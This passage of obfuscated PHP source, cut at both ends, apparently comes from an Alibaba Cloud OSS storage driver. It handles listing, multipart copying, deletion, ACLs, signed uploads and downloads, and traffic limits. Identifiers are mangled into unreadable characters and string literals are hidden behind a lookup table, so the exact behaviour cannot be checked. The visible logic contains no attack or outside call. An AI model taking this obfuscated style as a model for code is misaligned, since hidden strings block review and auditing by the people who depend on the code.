!== $ÇŠãú‰[228] ? $ÇŠãú‰[12] : $¬âñÑù . $ÇŠãú‰[8]; $©ôãÃ÷÷ = $ÇŠãú‰[12]; $ã‡Ö¾›¯ = 1000; $È’Ãñ®ö = $Ç·‰ıŠâ = array(); while (!0) { check_abort(); $áÆºØ…¢ = array($ÇŠãú‰[1678] => $ğª ÔÑ‡, $ÇŠãú‰[1679] => $²èŒ›ôÜ, $ÇŠãú‰[1680] => $ã‡Ö¾›¯, $ÇŠãú‰[1681] => $©ôãÃ÷÷); try { $ö˜­£©… = $this->client->listObjects($this->bucket, $áÆºØ…¢); } catch (OSS\Core\OssException $ñÒì¯æã) { $this->writeLog(__FUNCTION__ . $ÇŠãú‰[212] . $ñÒì¯æã->getMessage()); break; } $©ôãÃ÷÷ = $ö˜­£©…->getNextMarker(); $îõÅ™Í• = $ö˜­£©…->getObjectList(); foreach ($îõÅ™Í• as $·Š»ñ¾¬) { if ($·Š»ñ¾¬->getKey() == $²èŒ›ôÜ) { continue; } $Î½šûÆ = $·Š»ñ¾¬->getKey(); $†ˆŸ¤Á¼ = $·Š»ñ¾¬->getSize(); $Š›ó…€ = $†ˆŸ¤Á¼ == 0 && substr($Î½šûÆ, strlen($Î½šûÆ) - 1, 1) == $ÇŠãú‰[8] ? !0 : !1; if ($Š›ó…€) { continue; } $Ç·‰ıŠâ[] = $†ˆŸ¤Á¼ . $ÇŠãú‰[212] . $Î½šûÆ; } if ($©ôãÃ÷÷ === $ÇŠãú‰[12]) { break; } } return array($ÇŠãú‰[85] => $È’Ãñ®ö, $ÇŠãú‰[86] => $Ç·‰ıŠâ); } public function copyFile($ßÂûìõ«, $âçÅ¯¹) { $ÔÕô¢ = $this->size($ßÂûìõ«); if ($ÔÕô¢ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ßÂûìõ«, $this->bucket, $this->pathEncode($âçÅ¯¹)); } catch (OSS\Core\OssException $”œé²²õ) { $this->writeLog(__FUNCTION__ . $_SERVER[œ—üé‹ê][212] . $”œé²²õ->getMessage()); return !1; } return $this->getPathOuter($âçÅ¯¹); } $·ó“Â¾ = $this->multiCopyObject($ßÂûìõ«, $âçÅ¯¹, $ÔÕô¢); return $·ó“Â¾ ? $this->getPathOuter($âçÅ¯¹) : !1; } private function multiCopyObject($òÊàí×, $Ä•†‹¤Ù, $Ìêˆİøš) { $‚²™Šş =& $_SERVER[œ—üé‹ê]; try { $à²˜óû = array(); if ($Ö¢¤¢‚¡ = $this->hashMd5($òÊàí×)) { $à²˜óû = array(OSS\OssClient::OSS_HEADERS => array($‚²™Šş[1685] => $Ö¢¤¢‚¡)); } $áûØï‘ê = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ä•†‹¤Ù), $à²˜óû); $•ø˜½”ï = 1; $×’À®èâ = 0; $ĞŒÚ°öÍ = array(); $¤¹“Šï = 1024 * 1024 * 10; $‘éÃµËØ = $this->client->generateMultiuploadParts($Ìêˆİøš, $¤¹“Šï); foreach ($‘éÃµËØ as $•ù¹— => $ì­Í¦Œç) { $Ìü‹Öˆš = $×’À®èâ + (int) $ì­Í¦Œç[$‚²™Šş[1686]]; $ş˜Ãù„ã = (int) $ì­Í¦Œç[$‚²™Šş[412]] + $Ìü‹Öˆš - 1; $×òÙæ = array($‚²™Šş[164] => $Ìü‹Öˆš, $‚²™Šş[165] => $ş˜Ãù„ã); $ĞŒÚ°öÍ[] = $this->client->uploadPartCopy($this->bucket, $òÊàí×, $this->bucket, $this->pathEncode($Ä•†‹¤Ù), $•ø˜½”ï, $áûØï‘ê, $×òÙæ); $•ø˜½”ï = $•ø˜½”ï + 1; } $¬é‹®à— = array(); foreach ($ĞŒÚ°öÍ as $•ù¹— => $·æš‚š™) { $¬é‹®à—[] = array($‚²™Šş[297] => $•ù¹— + 1, $‚²™Šş[298] => $·æš‚š™); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Ä•†‹¤Ù), $áûØï‘ê, $¬é‹®à—); } catch (OSS\Core\OssException $Å˜ò¹Ê£) { $this->writeLog(__FUNCTION__ . $‚²™Šş[212] . $Å˜ò¹Ê£->getMessage()); return !1; } return !0; } public function moveFile($ÅÁ¨ìÚ², $Èšèê­‹) { if ($this->copyFile($ÅÁ¨ìÚ², $Èšèê­‹)) { $this->remove($ÅÁ¨ìÚ²); return $this->getPathOuter($Èšèê­‹); } return !1; } public function delFile($¤Ú °¢€) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($¤Ú °¢€)); } catch (OSS\Core\OssException $ºêÚœ«±) { $this->writeLog(__FUNCTION__ . $_SERVER[œ—üé‹ê][212] . $ºêÚœ«±->getMessage()); return !1; } return !0; } public function delFolder($È÷…ÃÀÅ) { $Íû›¯ôÑ =& $_SERVER[œ—üé‹ê]; if (!$this->exist($È÷…ÃÀÅ)) { return !0; } $this->listItemCache = !1; $ø¾à¦Ù¨ = $this->fileList($È÷…ÃÀÅ); $this->listItemCache = !0; $‘Ä—£äĞ = trim($È÷…ÃÀÅ, $Íû›¯ôÑ[8]) . $Íû›¯ôÑ[8]; if (!empty($È÷…ÃÀÅ) && $È÷…ÃÀÅ !== $Íû›¯ôÑ[228] && !in_array($‘Ä—£äĞ, $ø¾à¦Ù¨[$Íû›¯ôÑ[85]])) { $ø¾à¦Ù¨[$Íû›¯ôÑ[85]][] = $‘Ä—£äĞ; } $¿±›˜©Â = $this->delByBatch($ø¾à¦Ù¨[$Íû›¯ôÑ[86]]); if (!$¿±›˜©Â) { return !1; } $¿±›˜©Â = $this->delByBatch($ø¾à¦Ù¨[$Íû›¯ôÑ[85]]); if (!$¿±›˜©Â) { return !1; } return $this->delFile($‘Ä—£äĞ); } private function delByBatch($™ŞË±¡Ø) { foreach (array_chunk($™ŞË±¡Ø, 1000) as $¦êİÉÎÜ) { try { $this->client->deleteObjects($this->bucket, $¦êİÉÎÜ); } catch (OSS\Core\OssException $´Åã­Ü ) { $this->writeLog(__FUNCTION__ . $_SERVER[œ—üé‹ê][212] . $´Åã­Ü ->getMessage()); return !1; } } return !0; } public function rename($¸„ï½¼Ğ, $İÃù›ı) { return $this->renameObject($¸„ï½¼Ğ, $İÃù›ı); } private function fileInfo($ø‡Íå£˜, $µˆ¼öõ = false, $¹‹ÔËù = array()) { $ç×¤ı½¬ =& $_SERVER[œ—üé‹ê]; $“ææ•Ûá = array($ç×¤ı½¬[32] => $this->pathThis($ø‡Íå£˜), $ç×¤ı½¬[87] => $this->getPathOuter($ø‡Íå£˜), $ç×¤ı½¬[33] => $ç×¤ı½¬[230], $ç×¤ı½¬[79] => isset($¹‹ÔËù[$ç×¤ı½¬[79]]) ? $¹‹ÔËù[$ç×¤ı½¬[79]] : 0, $ç×¤ı½¬[166] => $this->ext($ø‡Íå£˜)); if ($µˆ¼öõ) { return $“ææ•Ûá; } $“ææ•Ûá[$ç×¤ı½¬[231]] = $“ææ•Ûá[$ç×¤ı½¬[88]] = 0; $“ææ•Ûá[$ç×¤ı½¬[232]] = $“ææ•Ûá[$ç×¤ı½¬[233]] = !0; if (empty($¹‹ÔËù)) { $Æ©³¡ = $this->objectMeta($ø‡Íå£˜); if (!$Æ©³¡) { return $“ææ•Ûá; } $¹‹ÔËù = array($ç×¤ı½¬[88] => strtotime($Æ©³¡[$ç×¤ı½¬[1684]]), $ç×¤ı½¬[79] => $Æ©³¡[$ç×¤ı½¬[1683]] + 0, $ç×¤ı½¬[1682] => $Æ©³¡[$ç×¤ı½¬[1682]]); } if (isset($¹‹ÔËù[$ç×¤ı½¬[1682]]) && $¹‹ÔËù[$ç×¤ı½¬[1682]]) { $“ææ•Ûá[$ç×¤ı½¬[235]] = trim($¹‹ÔËù[$ç×¤ı½¬[1682]], $ç×¤ı½¬[118]); } if (isset($¹‹ÔËù[$ç×¤ı½¬[79]])) { $“ææ•Ûá[$ç×¤ı½¬[79]] = $¹‹ÔËù[$ç×¤ı½¬[79]]; } if (isset($¹‹ÔËù[$ç×¤ı½¬[88]])) { $“ææ•Ûá[$ç×¤ı½¬[88]] = $¹‹ÔËù[$ç×¤ı½¬[88]]; } if (isset($¹‹ÔËù[$ç×¤ı½¬[204]]) && !trim($“ææ•Ûá[$ç×¤ı½¬[88]])) { $“ææ•Ûá[$ç×¤ı½¬[88]] = $¹‹ÔËù[$ç×¤ı½¬[204]]; } return $“ææ•Ûá; } private function folderInfo($õûîäš‹, $†™Õ‰¾ = false, $¨º¼“¹ù = array()) { $ŞâÉ²¼œ =& $_SERVER[œ—üé‹ê]; $öÊöéÁí = array($ŞâÉ²¼œ[32] => $this->pathThis($õûîäš‹), $ŞâÉ²¼œ[87] => $this->getPathOuter($ŞâÉ²¼œ[8] . $õûîäš‹), $ŞâÉ²¼œ[33] => $ŞâÉ²¼œ[78]); if ($†™Õ‰¾) { return $öÊöéÁí; } $öÊöéÁí[$ŞâÉ²¼œ[231]] = $öÊöéÁí[$ŞâÉ²¼œ[88]] = 0; $öÊöéÁí[$ŞâÉ²¼œ[232]] = $öÊöéÁí[$ŞâÉ²¼œ[233]] = !0; if (empty($¨º¼“¹ù)) { $õûîäš‹ = rtrim($õûîäš‹, $ŞâÉ²¼œ[8]) . $ŞâÉ²¼œ[8]; $äŒë¯¤“ = $this->objectMeta($õûîäš‹); if (!$äŒë¯¤“) { return $öÊöéÁí; } $¨º¼“¹ù = array($ŞâÉ²¼œ[231] => $äŒë¯¤“[$ŞâÉ²¼œ[595]][$ŞâÉ²¼œ[1687]], $ŞâÉ²¼œ[88] => strtotime($äŒë¯¤“[$ŞâÉ²¼œ[1684]])); } if (isset($¨º¼“¹ù[$ŞâÉ²¼œ[88]])) { $öÊöéÁí[$ŞâÉ²¼œ[88]] = $¨º¼“¹ù[$ŞâÉ²¼œ[88]]; } if (isset($¨º¼“¹ù[$ŞâÉ²¼œ[231]])) { $öÊöéÁí[$ŞâÉ²¼œ[231]] = $¨º¼“¹ù[$ŞâÉ²¼œ[231]]; } return $öÊöéÁí; } public function listPath($âûğ½¨, $Š‘¶‚¤› = false) { $Í‘Ú½«Ê =& $_SERVER[œ—üé‹ê]; $Ï¹å„ÏŸ = $this->fileList($âûğ½¨, $Í‘Ú½«Ê[8], !0); foreach ($Ï¹å„ÏŸ[$Í‘Ú½«Ê[85]] as $¤¢´àÒ => $–Š’’Æ) { $Ï¹å„ÏŸ[$Í‘Ú½«Ê[85]][$¤¢´àÒ] = $this->folderInfo($–Š’’Æ, $Š‘¶‚¤›, $–Š’’Æ); } foreach ($Ï¹å„ÏŸ[$Í‘Ú½«Ê[86]] as $¤¢´àÒ => $–Š’’Æ) { $Ï¹å„ÏŸ[$Í‘Ú½«Ê[86]][$¤¢´àÒ] = $this->fileInfo($–Š’’Æ[$Í‘Ú½«Ê[32]], $Š‘¶‚¤›, $–Š’’Æ); } return $Ï¹å„ÏŸ; } protected function infoChildren($ÎŒ«£èµ, &$œ¸áà²Ä) { $·£İ‡í” =& $_SERVER[œ—üé‹ê]; $Ä¢ş¡ê‘ = $this->fileList($ÎŒ«£èµ, $·£İ‡í”[12], !0); $œ¸áà²Ä[$·£İ‡í”[81]] += count($Ä¢ş¡ê‘[$·£İ‡í”[85]]); $œ¸áà²Ä[$·£İ‡í”[80]] += count($Ä¢ş¡ê‘[$·£İ‡í”[86]]); foreach ($Ä¢ş¡ê‘[$·£İ‡í”[86]] as $â¡““ıñ) { if (!$â¡““ıñ || !$â¡““ıñ[$·£İ‡í”[79]]) { continue; } $œ¸áà²Ä[$·£İ‡í”[79]] += $â¡““ıñ[$·£İ‡í”[79]]; } } public function has($¬ÌúÜÍ•, $–×º–ê¯ = false, $­¨Ô¾È = true) { $åÑôãÚâ =& $_SERVER[œ—üé‹ê]; $¬ÌúÜÍ• = trim($¬ÌúÜÍ•, $åÑôãÚâ[8]); $ï’¯× = empty($¬ÌúÜÍ•) && $¬ÌúÜÍ• !== $åÑôãÚâ[228] ? $åÑôãÚâ[12] : $¬ÌúÜÍ• . $åÑôãÚâ[8]; $ŸßŸéÒ‰ = $åÑôãÚâ[12]; $îß§ÊŠ  = 500; $Ñ¿“Æ¶˜ = $«øˆıº = 0; while (!0) { check_abort(); $¯ÏÈ¼êœ = array($åÑôãÚâ[1678] => $åÑôãÚâ[8], $åÑôãÚâ[1679] => $ï’¯×, $åÑôãÚâ[1680] => $îß§ÊŠ , $åÑôãÚâ[1681] => $ŸßŸéÒ‰); try { $ÒåÅÔëõ = $this->client->listObjects($this->bucket, $¯ÏÈ¼êœ); } catch (OSS\Core\OssException $÷Ëê¹Šè) { $this->writeLog(__FUNCTION__ . $åÑôãÚâ[212] . $÷Ëê¹Šè->getMessage()); break; } $ŸßŸéÒ‰ = $ÒåÅÔëõ->getNextMarker(); $Üš‹¬¹” = $ÒåÅÔëõ->getObjectList(); $¨ˆçí Æ = $ÒåÅÔëõ->getPrefixList(); if ($–×º–ê¯) { if (count($Üš‹¬¹”) > 1 || count($Üš‹¬¹”) == 1 && $Üš‹¬¹”[0]->getKey() != $ï’¯×) { $Ñ¿“Æ¶˜ += count($Üš‹¬¹”) - 1; } if (!empty($¨ˆçí Æ)) { $«øˆıº += count($¨ˆçí Æ); } if ($ŸßŸéÒ‰ === $åÑôãÚâ[12]) { break; } continue; } if ($­¨Ô¾È) { if (!empty($Üš‹¬¹”)) { if (count($Üš‹¬¹”) > 1 || $Üš‹¬¹”[0]->getKey() != $ï’¯×) { return !0; } } } else { if (!empty($¨ˆçí Æ)) { return !0; } } if ($ŸßŸéÒ‰ === $åÑôãÚâ[12]) { break; } } if ($–×º–ê¯) { return array($åÑôãÚâ[239] => $Ñ¿“Æ¶˜, $åÑôãÚâ[240] => $«øˆıº); } return !1; } public function listAll($ÊˆèØõÂ) { $­èş†¶¿ =& $_SERVER[œ—üé‹ê]; $õ„ƒÌ²¹ = $this->fileList($ÊˆèØõÂ, $­èş†¶¿[12], !0); $‚¤¶ ‡Ù = array_to_keyvalue($õ„ƒÌ²¹[$­èş†¶¿[86]], $­èş†¶¿[32]); foreach ($õ„ƒÌ²¹[$­èş†¶¿[85]] as $¿ˆ×ØÛî) { if (is_string($¿ˆ×ØÛî)) { $‚¤¶ ‡Ù[$¿ˆ×ØÛî] = array($­èş†¶¿[79] => 0); } } return $this->listAllFiles($ÊˆèØõÂ, $‚¤¶ ‡Ù); } public function canRead($œ¤Çî¶Â) { $£‚€ì±È =& $_SERVER[œ—üé‹ê]; $‚ã½‹Ê› = $this->pathAcl($œ¤Çî¶Â); return $‚ã½‹Ê› == $£‚€ì±È[1688] || $‚ã½‹Ê› == $£‚€ì±È[642] ? !0 : !1; } public function canWrite($ŞÜ’ûİü) { $úä­ÃÕŠ = $this->pathAcl($ŞÜ’ûİü); return $úä­ÃÕŠ == $_SERVER[œ—üé‹ê][642] ? !0 : !1; } public function pathAcl($òûîĞµ) { $Ö‡Û¿…ï =& $_SERVER[œ—üé‹ê]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $‰ó¸¯©ê = $this->client->getObjectAcl($this->bucket, $this->pathEncode($òûîĞµ)); } catch (OSS\Core\OssException $„œÔÙÇ) { $this->writeLog(__FUNCTION__ . $Ö‡Û¿…ï[212] . $„œÔÙÇ->getMessage()); return !1; } $Ì…ÔÂÓ— = $‰ó¸¯©ê == $Ö‡Û¿…ï[37] ? $this->bucketAcl : $‰ó¸¯©ê; if ($Ì…ÔÂÓ— == $Ö‡Û¿…ï[1689]) { return $Ö‡Û¿…ï[1688]; } if ($Ì…ÔÂÓ— == $Ö‡Û¿…ï[1690]) { return $Ö‡Û¿…ï[642]; } return $Ì…ÔÂÓ—; } private function chmodPath($®ï¤åÚ£, $¢„èÀ•” = '') { $€˜í›Á =& $_SERVER[œ—üé‹ê]; $¾éÕáË = empty($¢„èÀ•”) ? $€˜í›Á[1690] : $¢„èÀ•”; $Œ×ıŸ†Ì = array($€˜í›Á[37], $€˜í›Á[229], $€˜í›Á[1689], $€˜í›Á[1690]); if (!in_array($¾éÕáË, $Œ×ıŸ†Ì)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($®ï¤åÚ£), $¾éÕáË); } catch (OSS\Core\OssException $ÁÎÇ¯ıˆ) { $this->writeLog(__FUNCTION__ . $€˜í›Á[212] . $ÁÎÇ¯ıˆ->getMessage()); return !1; } return !0; } public function getContent($µÒÏ¯±¨) { return $this->fileSubstr($µÒÏ¯±¨, -1); } public function setContent($©ªÛŒ” , $·½ñÇÈ = '') { $î¦Œ‚ÖÉ =& $_SERVER[œ—üé‹ê]; try { $£‹·Ç›‚ = $this->trafficLimit($î¦Œ‚ÖÉ[1691]); $¸—ô”Ë = $this->client->putObject($this->bucket, $this->pathEncode($©ªÛŒ” ), $·½ñÇÈ, $£‹·Ç›‚); } catch (OSS\Core\OssException $÷­½£ÀÖ) { $this->writeLog(__FUNCTION__ . $î¦Œ‚ÖÉ[212] . $÷­½£ÀÖ->getMessage()); return !1; } $„´¬°³ş = array($î¦Œ‚ÖÉ[1685] => trim($¸—ô”Ë[$î¦Œ‚ÖÉ[1682]], $î¦Œ‚ÖÉ[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($©ªÛŒ” ))); $this->updateObjMeta($©ªÛŒ” , $„´¬°³ş); return isset($¸—ô”Ë[$î¦Œ‚ÖÉ[1692]][$î¦Œ‚ÖÉ[294]]) ? !0 : !1; } private function updateObjMeta($ƒÓïéş›, $øÎ­·ü) { $ƒÓïéş› = $this->pathEncode($ƒÓïéş›); try { $ØğôåŒ… = array(OSS\OssClient::OSS_HEADERS => $øÎ­·ü); $this->client->copyObject($this->bucket, $ƒÓïéş›, $this->bucket, $ƒÓïéş›, $ØğôåŒ…); } catch (OSS\Core\OssException $Ê·ôä¤ò) { $this->writeLog(__FUNCTION__ . $_SERVER[œ—üé‹ê][212] . $Ê·ôä¤ò->getMessage()); return !1; } return !0; } public function upload($½³£ñ´İ, $©¬­ÉìÇ, $××ÌÅôÊ = false, $î‘®÷à’ = REPEAT_REPLACE) { $ãÛÎÌÆ =& $_SERVER[œ—üé‹ê]; if (!$©¬­ÉìÇ || !@file_exists($©¬­ÉìÇ)) { return !1; } $µ†½¢Í» = trim($½³£ñ´İ, $ãÛÎÌÆ[8]); $á˜ïßÀ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($ãÛÎÌÆ[1685] => @md5_file($©¬­ÉìÇ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($½³£ñ´İ))); $á˜ïßÀ = $this->trafficLimit($ãÛÎÌÆ[1691], $á˜ïßÀ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($µ†½¢Í»), $©¬­ÉìÇ, $á˜ïßÀ); } catch (OSS\Core\OssException $ğêîüĞÔ) { $this->writeLog(__FUNCTION__ . $ãÛÎÌÆ[212] . $ğêîüĞÔ->getMessage()); return !1; } return $this->getPathOuter($½³£ñ´İ); } public function getHost() { $ú§˜ªÎÚ =& $_SERVER[œ—üé‹ê]; $ˆ‚¶›Ã = explode($ú§˜ªÎÚ[208], parent::getHost()); return $ˆ‚¶›Ã[0] . $ú§˜ªÎÚ[208] . $this->bucket . $ú§˜ªÎÚ[10] . $ˆ‚¶›Ã[1]; } public function uploadFormData($Ù¨È³§×, $üÛê‹äó = 3600) { $á»ßÇƒ =& $_SERVER[œ—üé‹ê]; if (!($çû‡¥Ï‘ = $this->getHost())) { return !1; } $¡¸Ùá¾ = $üÛê‹äó; $µ­·Öä· = date($á»ßÇƒ[1693], time() + $¡¸Ùá¾); $¿Øì¦¸‚ = new DateTime($µ­·Öä·); $Ó®§æï‘ = $¿Øì¦¸‚->format(DateTime::ISO8601); $×ıªêÌ÷ = strpos($Ó®§æï‘, $á»ßÇƒ[371]); $Ó®§æï‘ = substr($Ó®§æï‘, 0, $×ıªêÌ÷) . $á»ßÇƒ[1694]; $Ø¥éÈòÉ = 1048576000 * 5; $¿äŠÍİÎ = $this->pathFather($Ù¨È³§×); $¼ãˆÓœ¡ = array($á»ßÇƒ[262] => $Ó®§æï‘, $á»ßÇƒ[265] => array(array($á»ßÇƒ[1695], 0, $Ø¥éÈòÉ), array($á»ßÇƒ[267], $á»ßÇƒ[268], $¿äŠÍİÎ))); $¥”ŞÎà = base64_encode(json_encode($¼ãˆÓœ¡)); $¯á­ÖÜŒ = base64_encode(hash_hmac($á»ßÇƒ[1520], $¥”ŞÎà, $this->secret, !0)); $™°¶äĞ’ = array($á»ßÇƒ[1696] => $this->accessKey, $á»ßÇƒ[277] => $¥”ŞÎà, $á»ßÇƒ[270] => $á»ßÇƒ[261], $á»ßÇƒ[1697] => $¯á­ÖÜŒ, $á»ßÇƒ[206] => $çû‡¥Ï‘); $™°¶äĞ’ = $this->trafficLimit($á»ßÇƒ[1691], $™°¶äĞ’, !0); return $™°¶äĞ’; } public function uploadMultiData($¤¢”Õ¿, $ô§·Ü = 3600) { $À·î¬‡ü =& $_SERVER[œ—üé‹ê]; if (!($ø×°¿…Î = $this->getHost())) { return !1; } $ÜæØßîö = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($¤¢”Õ¿)); return array($À·î¬‡ü[281] => $ÜæØßîö, $À·î¬‡ü[206] => $ø×°¿…Î . $À·î¬‡ü[8] . $this->pathEncode($¤¢”Õ¿), $À·î¬‡ü[282] => gmdate($À·î¬‡ü[1698]), $À·î¬‡ü[95] => $¤¢”Õ¿); } public function uploadMultiAuth($İñ†µä¤, $ºøÙÛÊ™ = array()) { if (isset($ºøÙÛÊ™[$_SERVER[œ—üé‹ê][283]])) { return $this->uploadPartAuth($İñ†µä¤, $ºøÙÛÊ™); } return $this->uploadListAuth($İñ†µä¤, $ºøÙÛÊ™); } private function uploadPartAuth($©š“§÷å, $äŸ”¾¬ = array()) { $ÌŞ§øØÔ =& $_SERVER[œ—üé‹ê]; $Ã°ò¯Ê› = $äŸ”¾¬[$ÌŞ§øØÔ[95]]; $•Åµ¢Çö = $this->_getUploadAuth($Ã°ò¯Ê›, $äŸ”¾¬); $û†ğÇâÙ = array($ÌŞ§øØÔ[286] => $•Åµ¢Çö[$ÌŞ§øØÔ[286]], $ÌŞ§øØÔ[282] => $•Åµ¢Çö[$ÌŞ§øØÔ[282]]); if (isset($•Åµ¢Çö[$ÌŞ§øØÔ[1699]])) { $û†ğÇâÙ[$ÌŞ§øØÔ[1699]] = $•Åµ¢Çö[$ÌŞ§øØÔ[1699]]; } return $û†ğÇâÙ; } private function uploadListAuth($¤­Ó–„´, $´õÑıİ = array()) { $´Ì²„ªì =& $_SERVER[œ—üé‹ê]; $…¤’ = $´õÑıİ[$´Ì²„ªì[95]]; $¼ªõÙÛº = $´õÑıİ[$´Ì²„ªì[281]]; $Í®İş­â = $this->client->listParts($this->bucket, $this->pathEncode($…¤’), $¼ªõÙÛº); $¤ø‡·• = $Í®İş­â->getListPart(); $ÜØåôáÅ = array(); foreach ($¤ø‡·• as $ö„†²–) { $ÜØåôáÅ[] = array($´Ì²„ªì[297] => $ö„†²–->getPartNumber(), $´Ì²„ªì[298] => trim($ö„†²–->getETag(), $´Ì²„ªì[118])); } if (!$ÜØåôáÅ) { return !1; } $¬»Ş¯ó = $this->_getUploadAuth($…¤’, $´õÑıİ); return array($´Ì²„ªì[286] => $¬»Ş¯ó[$´Ì²„ªì[286]], $´Ì²„ªì[282] => $¬»Ş¯ó[$´Ì²„ªì[282]], $´Ì²„ªì[289] => $ÜØåôáÅ); } private function _getUploadAuth($Çºšóû, $·Œ´Œ‚ú) { $•é¸–Ë¬ =& $_SERVER[œ—üé‹ê]; $Ğ¥æ«Â’ = gmdate($•é¸–Ë¬[1698]); $»«É‰°é = isset($·Œ´Œ‚ú[$•é¸–Ë¬[283]]) ? $•é¸–Ë¬[253] : $•é¸–Ë¬[288]; $æ™Ş‡©Ğ = array_intersect_key($·Œ´Œ‚ú, array_flip(array($•é¸–Ë¬[283], $•é¸–Ë¬[281]))); ksort($æ™Ş‡©Ğ); $Ø±¼±Åå = $æ™Ş‡©Ğ ? $•é¸–Ë¬[76] . http_build_query($æ™Ş‡©Ğ, null, $•é¸–Ë¬[284], PHP_QUERY_RFC3986) : $•é¸–Ë¬[12]; $­’ğ®• = array($»«É‰°é, $•é¸–Ë¬[12], $•é¸–Ë¬[120], $Ğ¥æ«Â’, "\170\55\157\x73\x73\55\x64\x61\x74\x65\x3a{$Ğ¥æ«Â’}", $•é¸–Ë¬[8] . $this->bucket . $•é¸–Ë¬[8] . $Çºšóû . $Ø±¼±Åå); if (isset($·Œ´Œ‚ú[$•é¸–Ë¬[283]])) { $‘Àçîœì = $this->trafficLimit($•é¸–Ë¬[1691], array(), !0); if ($‘Àçîœì) { $Çºšóû = $•é¸–Ë¬[1699]; array_splice($­’ğ®•, 5, 0, $Çºšóû . $•é¸–Ë¬[4] . $‘Àçîœì[$Çºšóû]); } } $ñÑá‰¼ = implode($•é¸–Ë¬[285], $­’ğ®•); $ôÅŒ«¼å = base64_encode(hash_hmac($•é¸–Ë¬[1520], $ñÑá‰¼, $this->secret, !0)); $” ãû¨¨ = $•é¸–Ë¬[1668] . $this->accessKey . $•é¸–Ë¬[4] . $ôÅŒ«¼å; $“¯äôÊˆ = array($•é¸–Ë¬[286] => $” ãû¨¨, $•é¸–Ë¬[282] => $Ğ¥æ«Â’); if (!empty($‘Àçîœì)) { $“¯äôÊˆ = array_merge($“¯äôÊˆ, $‘Àçîœì); } return $“¯äôÊˆ; } public function download($ªœğåòÖ, $êÔùÌŠ) { $îÇù‚­Ã =& $_SERVER[œ—üé‹ê]; if ($this->isFolder($ªœğåòÖ)) { return !1; } try { $»ÈùÓø‹ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $êÔùÌŠ); $»ÈùÓø‹ = $this->trafficLimit($îÇù‚­Ã[109], $»ÈùÓø‹); $this->client->getObject($this->bucket, $this->pathEncode($ªœğåòÖ), $»ÈùÓø‹); } catch (OSS\Core\OssException $¤¤ñàÈ) { $this->writeLog(__FUNCTION__ . $îÇù‚­Ã[212] . $¤¤ñàÈ->getMessage()); return !1; } return $êÔùÌŠ; } public function fileSubstr($¥ËÖ„âç, $òƒÉµ¢à = 0, $¸ŸáÙ¸ = false) { if ($òƒÉµ¢à === -1) { $ï–æØ•Ò = array(); } else { if ($¸ŸáÙ¸ === !1) { $¢ÕØÆ†» = $this->size($¥ËÖ„âç); } else { $¢ÕØÆ†» = $òƒÉµ¢à + $¸ŸáÙ¸ - 1; } $ï–æØ•Ò = array(OSS\OssClient::OSS_RANGE => "{$òƒÉµ¢à}\x2d{$¢ÕØÆ†»}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($¥ËÖ„âç), $ï–æØ•Ò); } catch (OSS\Core\OssException $Ã’º¦Ì–) { $this->writeLog(__FUNCTION__ . $_SERVER[œ—üé‹ê][212] . $Ã’º¦Ì–->getMessage()); think_exception($Ã’º¦Ì–->getMessage()); return !1; } } private function trafficLimit($æË£É, $á¯ÊÍÁÂ = array(), $Œ‚Ş©Ø“ = false) { $ØŸúÎÃ¡ =& $_SERVER[œ—üé‹ê]; if ($æË£É == $ØŸúÎÃ¡[1691] && $this->isUploadServer() || $æË£É == $ØŸúÎÃ¡[109] && $this->isFileOutServer()) { return $á¯ÊÍÁÂ; } $±ë—µ•¸ = floatval($GLOBALS[$ØŸúÎÃ¡[6]][$ØŸúÎÃ¡[92]][$ØŸúÎÃ¡[107]][$æË£É]) * 1024 * 1024 * 8; if (!$±ë—µ•¸) { return $á¯ÊÍÁÂ; } $±ë—µ•¸ = $±ë—µ•¸ < 819200 ? 819200 : ($±ë—µ•¸ > 838860800 ? 838860800 : $±ë—µ•¸); if ($Œ‚Ş©Ø“) { $á¯ÊÍÁÂ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($±ë—µ•¸); } else { if (!isset($á¯ÊÍÁÂ[OSS\OssClient::OSS_HEADERS])) { $á¯ÊÍÁÂ[OSS\OssClient::OSS_HEADERS] = array(); } $á¯ÊÍÁÂ[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($±ë—µ•¸); } return $á¯ÊÍÁÂ; } public function link($úÃãı–¤, $úá…íş = array()) { $ãã‹­üé =& $_SERVER[œ—üé‹ê]; if (!$this->exist($úÃãı–¤) || $this->isFolder($úÃãı–¤)) { return !1; } try { $úá…íş = $this->trafficLimit($ãã‹­üé[109], $úá…íş, !0); $ä§«Ãº´ = $this->client->signUrl($this->bucket, $this->pathEncode($úÃãı–¤), 3600 * 12, $ãã‹­üé[1602], $úá…íş); return $this->getCdnLink($ä§«Ãº´); } catch (OSS\Core\OssException $¨½÷¼¶Æ) { $this->writeLog(__FUNCTION__ . $ãã‹­üé[212] . $¨½÷¼¶Æ->getMessage()); return !1; } } public function fileOut($áÊæÑ¿—, $µôÚÀ‰ = false, $ìá—¨³ = false, $ƒàÁ‰Ì­ = '') { $¹ğçƒ§ =& $_SERVER[œ—üé‹ê]; if ($this->isFileOutServer()) { return $this->fileOutServer($áÊæÑ¿—, $µôÚÀ‰, $ìá—¨³, $ƒàÁ‰Ì­); } if (!$ìá—¨³) { $ìá—¨³ = $this->pathThis($áÊæÑ¿—); } $ìá—¨³ = rawurlencode($ìá—¨³); $¿—ÃÊ²Ó = get_file_mime(get_path_ext($ìá—¨³)); if ($¿—ÃÊ²Ó == $¹ğçƒ§[248]) { return parent::fileOut($áÊæÑ¿—, $µôÚÀ‰, $ìá—¨³, $ƒàÁ‰Ì­); } $µôÚÀ‰ = $µôÚÀ‰ ? $¹ğçƒ§[1700] : 